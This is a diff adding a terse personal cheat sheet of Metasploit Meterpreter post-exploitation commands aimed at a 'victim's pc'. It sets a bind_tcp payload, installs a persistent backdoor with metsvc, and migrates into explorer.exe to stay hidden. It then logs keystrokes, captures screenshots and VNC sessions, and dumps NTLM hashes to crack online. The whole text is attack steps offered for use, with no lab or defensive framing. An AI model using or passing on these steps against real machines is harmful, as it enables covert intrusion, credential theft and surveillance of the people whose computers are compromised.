@@ -1,0 +1,24 @@
+*for getting meterpreter shell of victims pc* and it will not show in task manager 
+
+set payload windows/meterpreter/bind_tcp
+
+on meterpreter -->run metsvc-->to install backdoor on victims pc -->check on netstat
+
+sysinfo
+getpid-->u will get process id
+getuid-->u will get user id
+ps-->migrate to explore.exe process number
+migrate  (process id number)
+
+-->getpid
+-->getuid
+
+(explorer is stable thats why we have to migrate to explorer)
+
+keyscan_start (in meterpreter)
+kill (pid) (we can kill the running process)
+screenshot
+screen screening(for recording)(VNC)
+hashdump
+crackstation ntlm on web browser to find out the password by hashing
+
